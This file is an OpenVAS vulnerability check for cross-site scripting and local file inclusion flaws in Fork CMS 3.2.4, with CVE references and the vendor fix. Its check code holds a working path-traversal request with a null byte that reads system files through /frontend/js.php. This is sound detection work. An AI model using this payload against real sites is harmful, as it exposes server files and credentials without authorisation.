###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_fork_cms_51972.nasl 12 2013-10-27 11:15:33Z jan $
#
# Fork CMS Cross Site Scripting and Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Fork CMS is prone to multiple cross-site scripting vulnerabilities and
a local file include vulnerability.

An attacker may leverage these issues to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site, steal cookie-based authentication credentials, and open or run
arbitrary files in the context of the webserver process.

Fork CMS 3.2.4 is vulnerable; other versions may also be affected.";

tag_solution = "Vendor update is available. Please see the references for more
information.";

if (description)
{
 script_id(103433);
 script_bugtraq_id(51972);
 script_cve_id("CVE-2012-1209","CVE-2012-1208","CVE-2012-1207");
 script_version ("$Revision: 12 $");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_name("Fork CMS Cross Site Scripting and Local File Include Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51972");
 script_xref(name : "URL" , value : "http://www.fork-cms.com/blog/detail/fork-cms-3-2-5-released");
 script_xref(name : "URL" , value : "http://www.fork-cms.com/features");
 script_xref(name : "URL" , value : "https://github.com/forkcms/forkcms/commit/c8ec9c58a6b3c46cdd924532c1de99bcda6072ed");
 script_xref(name : "URL" , value : "https://github.com/forkcms/forkcms/commit/df75e0797a6540c4d656969a2e7df7689603b2cf");

 script_tag(name:"risk_factor", value:"Medium");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-02-22 14:53:24 +0100 (Wed, 22 Feb 2012)");
 script_description(desc);
 script_summary("Determine if installed Fork cms is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list(cgi_dirs());
files = traversal_files();

foreach dir (dirs) {
  foreach file (keys(files)) {
   
    url = string(dir, "/frontend/js.php?module=",crap(data:"../",length:6*9),files[file],"%00&file=frontend.js&language=en"); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_warning(port:port);
      exit(0);

    }
  }
}

exit(0);

